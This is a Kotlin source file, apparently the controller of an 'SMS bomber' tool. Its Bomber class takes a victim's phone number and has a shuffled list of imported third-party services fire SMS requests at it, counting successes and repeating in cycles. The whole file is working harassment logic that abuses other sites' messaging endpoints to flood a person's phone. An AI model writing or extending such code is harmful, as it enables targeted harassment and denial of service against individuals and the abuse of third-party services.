package com.y9san9.b0mb3r.controller

import com.y9san9.b0mb3r.phone.Phone
import com.y9san9.b0mb3r.service.services
import com.y9san9.b0mb3r.utils.Observable
import java.lang.Integer.min

class Bomber (phone: String, fn: Bomber.() -> Unit = {}) : Observable<StateUpdate> {
    private val phone = Phone(phone)

    init {
        apply(fn)
    }

    /**
     * @param count the minimal count of sms will sent
     * (there are some services that we cannot check for success and method can send more messages than count)
     * @param cycleMeta the internal param, exists because start is recursive, you should not touch it
     */
    fun start(count: Int, cycleMeta: CycleMeta = CycleMeta()) {
        if(phone.text == null){
            push(BomberFinished(0, StopReason.ErrorResolvingNumber))
            return
        }
        val requested = min(services.size, count)
        var resulted = 0
        var success = 0
        services.shuffle()
        services.forEachIndexed { i, service ->
            if(i < count) {
                service.request(phone) {
                    val isSuccess = validator(it)
                    push(SmsSent(isSuccess, url))

                    if (isSuccess) success++
                    resulted++

                    if(resulted == requested) {
                        handleLast(count, success, cycleMeta.totalSuccess + success, cycleMeta.cycleNumber + 1)
                    }
                }
            }
        }
    }

    fun stop(){

    }

    data class CycleMeta(
        val totalSuccess: Int = 0,
        val cycleNumber: Int = 0
    )
}